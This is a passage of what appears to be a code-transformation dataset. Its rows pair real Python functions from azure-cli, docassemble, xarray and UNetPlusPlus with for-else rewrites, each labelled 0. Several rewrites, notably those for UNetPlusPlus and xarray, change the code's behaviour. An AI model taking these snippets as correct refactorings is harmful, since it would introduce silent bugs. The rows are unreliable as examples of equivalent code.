                                resource_type=ResourceType.MGMT_KEYVAULT,
                                min_api_version='2018-02-14',
                                resource_group_name=resource_group_name,
                                vault_name=vault_name,
                                parameters=VaultCreateOrUpdateParameters(
                                    location=vault.location,
                                    tags=vault.tags,
                                    properties=vault.properties),
                                no_wait=no_wait)","for x in rules.ip_rules:
    existing_ip_network = ip_network(x.value)
    new_ip_network = ip_network(ip)
    if new_ip_network.overlaps(existing_ip_network):
        logger.warning('IP/CIDR %s overlaps with %s, which exists already. Not adding duplicates.', ip, x.value)
        to_modify = False
        break
if to_modify:
    rules.ip_rules.append(IPRule(value=ip))
    to_update = True","for x in rules.ip_rules:
    existing_ip_network = ip_network(x.value)
    new_ip_network = ip_network(ip)
    if new_ip_network.overlaps(existing_ip_network):
        logger.warning('IP/CIDR %s overlaps with %s, which exists already. Not adding duplicates.', ip, x.value)
        break
else:
    rules.ip_rules.append(IPRule(value=ip))
    to_update = True",0
docassemble,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/docassemble/docassemble_webapp/docassemble/webapp/users/views.py,https://github.com/jhpyle/docassemble/tree/master/docassemble_webapp/docassemble/webapp/users/views.py,,user_list$59,"def user_list():
    setup_translation()
    page = request.args.get('page', None)
    if page:
        try:
            page = int(page) - 1
            assert page >= 0
        except:
            page = 0
    else:
        page = 0
    users = list()
    user_query = select(UserModel).options(db.joinedload(UserModel.roles)).where(and_(UserModel.nickname != 'cron', not_(UserModel.social_id.like('disabled$%')))).order_by(UserModel.id)
    if page > 0:
        user_query = user_query.offset(PAGINATION_LIMIT*page)
    user_query = user_query.limit(PAGINATION_LIMIT_PLUS_ONE)
    results_in_query = 0
    there_are_more = False
    for user in db.session.execute(user_query).unique().scalars():
        results_in_query += 1
        if results_in_query == PAGINATION_LIMIT_PLUS_ONE:
            there_are_more = True
            break
        role_names = [y.name for y in user.roles]
        if 'admin' in role_names:
            high_priv = 'admin'
        elif 'developer' in role_names:
            high_priv = 'developer'
        elif 'advocate' in role_names:
            high_priv = 'advocate'
        elif 'trainer' in role_names:
            high_priv = 'trainer'
        else:
            high_priv = 'user'
        name_string = ''
        if user.first_name:
            name_string += str(user.first_name) + "" ""
        if user.last_name:
            name_string += str(user.last_name)
        if name_string:
            name_string = str(name_string)
        active_string = ''
        if user.email is None:
            user_indicator = user.nickname
        else:
            user_indicator = user.email
        if user.active:
            is_active = True
        else:
            is_active = False
        users.append(dict(name=name_string, email=user_indicator, active=is_active, id=user.id, high_priv=high_priv))
    if there_are_more:
        next_page = page + 2
    else:
        next_page = None
    prev_page = page
    response = make_response(render_template('users/userlist.html', version_warning=None, bodyclass='daadminbody', page_title=word('User List'), tab_title=word('User List'), users=users, prev_page=prev_page, next_page=next_page), 200)
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, post-check=0, pre-check=0, max-age=0'
    return response","for user in db.session.execute(user_query).unique().scalars():
    results_in_query += 1
    if results_in_query == PAGINATION_LIMIT_PLUS_ONE:
        there_are_more = True
        break
    role_names = [y.name for y in user.roles]
    if 'admin' in role_names:
        high_priv = 'admin'
    elif 'developer' in role_names:
        high_priv = 'developer'
    elif 'advocate' in role_names:
        high_priv = 'advocate'
    elif 'trainer' in role_names:
        high_priv = 'trainer'
    else:
        high_priv = 'user'
    name_string = ''
    if user.first_name:
        name_string += str(user.first_name) + ' '
    if user.last_name:
        name_string += str(user.last_name)
    if name_string:
        name_string = str(name_string)
    active_string = ''
    if user.email is None:
        user_indicator = user.nickname
    else:
        user_indicator = user.email
    if user.active:
        is_active = True
    else:
        is_active = False
    users.append(dict(name=name_string, email=user_indicator, active=is_active, id=user.id, high_priv=high_priv))
if there_are_more:
    next_page = page + 2
else:
    next_page = None","for user in db.session.execute(user_query).unique().scalars():
    results_in_query += 1
    if results_in_query == PAGINATION_LIMIT_PLUS_ONE:
        next_page = page + 2
        break
    role_names = [y.name for y in user.roles]
    if 'admin' in role_names:
        high_priv = 'admin'
    elif 'developer' in role_names:
        high_priv = 'developer'
    elif 'advocate' in role_names:
        high_priv = 'advocate'
    elif 'trainer' in role_names:
        high_priv = 'trainer'
    else:
        high_priv = 'user'
    name_string = ''
    if user.first_name:
        name_string += str(user.first_name) + ' '
    if user.last_name:
        name_string += str(user.last_name)
    if name_string:
        name_string = str(name_string)
    active_string = ''
    if user.email is None:
        user_indicator = user.nickname
    else:
        user_indicator = user.email
    if user.active:
        is_active = True
    else:
        is_active = False
    users.append(dict(name=name_string, email=user_indicator, active=is_active, id=user.id, high_priv=high_priv))
else:
    next_page = None",0
xarray,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/xarray/xarray/core/concat.py,https://github.com/pydata/xarray/tree/master/xarray/core/concat.py,,process_subset_opt$296,"def process_subset_opt(opt, subset):
        if isinstance(opt, str):
            if opt == ""different"":
                if compat == ""override"":
                    raise ValueError(
                        f""Cannot specify both {subset}='different' and compat='override'.""
                    )
                # all nonindexes that are not the same in each dataset
                for k in getattr(datasets[0], subset):
                    if k not in concat_over:
                        equals[k] = None

                        variables = [
                            ds.variables[k] for ds in datasets if k in ds.variables
                        ]

                        if len(variables) == 1:
                            # coords=""different"" doesn't make sense when only one object
                            # contains a particular variable.
                            break
                        elif len(variables) != len(datasets) and opt == ""different"":
                            raise ValueError(
                                f""{k!r} not present in all datasets and coords='different'. ""
                                f""Either add {k!r} to datasets where it is missing or ""
                                ""specify coords='minimal'.""
                            )

                        # first check without comparing values i.e. no computes
                        for var in variables[1:]:
                            equals[k] = getattr(variables[0], compat)(
                                var, equiv=lazy_array_equiv
                            )
                            if equals[k] is not True:
                                # exit early if we know these are not equal or that
                                # equality cannot be determined i.e. one or all of
                                # the variables wraps a numpy array
                                break

                        if equals[k] is False:
                            concat_over.add(k)

                        elif equals[k] is None:
                            # Compare the variable of all datasets vs. the one
                            # of the first dataset. Perform the minimum amount of
                            # loads in order to avoid multiple loads from disk
                            # while keeping the RAM footprint low.
                            v_lhs = datasets[0].variables[k].load()
                            # We'll need to know later on if variables are equal.
                            computed = []
                            for ds_rhs in datasets[1:]:
                                v_rhs = ds_rhs.variables[k].compute()
                                computed.append(v_rhs)
                                if not getattr(v_lhs, compat)(v_rhs):
                                    concat_over.add(k)
                                    equals[k] = False
                                    # computed variables are not to be re-computed
                                    # again in the future
                                    for ds, v in zip(datasets[1:], computed):
                                        ds.variables[k].data = v.data
                                    break
                            else:
                                equals[k] = True

            elif opt == ""all"":
                concat_over.update(
                    set(getattr(datasets[0], subset)) - set(datasets[0].dims)
                )
            elif opt == ""minimal"":
                pass
            else:
                raise ValueError(f""unexpected value for {subset}: {opt}"")
        else:
            invalid_vars = [k for k in opt if k not in getattr(datasets[0], subset)]
            if invalid_vars:
                if subset == ""coords"":
                    raise ValueError(
                        ""some variables in coords are not coordinates on ""
                        f""the first dataset: {invalid_vars}""
                    )
                else:
                    raise ValueError(
                        ""some variables in data_vars are not data variables ""
                        f""on the first dataset: {invalid_vars}""
                    )
            concat_over.update(opt)","for var in variables[1:]:
    equals[k] = getattr(variables[0], compat)(var, equiv=lazy_array_equiv)
    if equals[k] is not True:
        break
if equals[k] is False:
    concat_over.add(k)
elif equals[k] is None:
    v_lhs = datasets[0].variables[k].load()
    computed = []
    for ds_rhs in datasets[1:]:
        v_rhs = ds_rhs.variables[k].compute()
        computed.append(v_rhs)
        if not getattr(v_lhs, compat)(v_rhs):
            concat_over.add(k)
            equals[k] = False
            for (ds, v) in zip(datasets[1:], computed):
                ds.variables[k].data = v.data
            break
    else:
        equals[k] = True","for var in variables[1:]:
    equals[k] = getattr(variables[0], compat)(var, equiv=lazy_array_equiv)
    if equals[k] is not True:
        concat_over.add(k)
        break
else:
    if equals[k] is None:
        v_lhs = datasets[0].variables[k].load()
        computed = []
        for ds_rhs in datasets[1:]:
            v_rhs = ds_rhs.variables[k].compute()
            computed.append(v_rhs)
            if not getattr(v_lhs, compat)(v_rhs):
                concat_over.add(k)
                equals[k] = False
                for (ds, v) in zip(datasets[1:], computed):
                    ds.variables[k].data = v.data
                break
        else:
            equals[k] = True",0
UNetPlusPlus,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/UNetPlusPlus/pytorch/nnunet/training/network_training/network_trainer.py,https://github.com/MrGiovanni/UNetPlusPlus/tree/master/pytorch/nnunet/training/network_training/network_trainer.py,NetworkTrainer,load_pretrained_weights$316,"def load_pretrained_weights(self,fname):                                    
        saved_model = torch.load(fname)                                         
        pretrained_dict = saved_model['state_dict']                             
        model_dict = self.network.state_dict()                                  
        fine_tune = True
        for key, _ in model_dict.items():
           if ('conv_blocks' in key):
               if (key in pretrained_dict) and (model_dict[key].shape == pretrained_dict[key].shape):
                   continue
               else:
                   fine_tune = False
                   break
        # filter unnecessary keys
        if fine_tune:
            pretrained_dict = {k: v for k, v in pretrained_dict.items() if
                           (k in model_dict) and (model_dict[k].shape == pretrained_dict[k].shape)}
            # 2. overwrite entries in the existing state dict                       
            model_dict.update(pretrained_dict)
            # print(model_dict)                                                     
            print(""############################################### Loading pre-trained Models Genesis from "",fname)
            print(""Below is the list of overlapping blocks in pre-trained Models Genesis and nnUNet architecture:"")
            for key, _ in pretrained_dict.items():
                print(key)
            print(""############################################### Done"")
            for key, _ in model_dict.items():
                print(key)
            self.network.load_state_dict(model_dict)
        else:
            print('############################################### Training from scratch')","for (key, _) in model_dict.items():
    if 'conv_blocks' in key:
        if key in pretrained_dict and model_dict[key].shape == pretrained_dict[key].shape:
            continue
        else:
            fine_tune = False
            break
if fine_tune:
    pretrained_dict = {k: v for (k, v) in pretrained_dict.items() if k in model_dict and model_dict[k].shape == pretrained_dict[k].shape}
    model_dict.update(pretrained_dict)
    print('############################################### Loading pre-trained Models Genesis from ', fname)
    print('Below is the list of overlapping blocks in pre-trained Models Genesis and nnUNet architecture:')
    for (key, _) in pretrained_dict.items():
        print(key)
    print('############################################### Done')
    for (key, _) in model_dict.items():
        print(key)
    self.network.load_state_dict(model_dict)
else:
    print('############################################### Training from scratch')","for (key, _) in model_dict.items():
    if 'conv_blocks' in key:
        if key in pretrained_dict and model_dict[key].shape == pretrained_dict[key].shape:
            print('############################################### Training from scratch')
            continue
        else:
            break
else:
    pretrained_dict = {k: v for (k, v) in pretrained_dict.items() if k in model_dict and model_dict[k].shape == pretrained_dict[k].shape}
    model_dict.update(pretrained_dict)
    print('############################################### Loading pre-trained Models Genesis from ', fname)
    print('Below is the list of overlapping blocks in pre-trained Models Genesis and nnUNet architecture:')
    for (key, _) in pretrained_dict.items():
        print(key)
    print('############################################### Done')
    for (key, _) in model_dict.items():
        print(key)
    self.network.load_state_dict(model_dict)",0
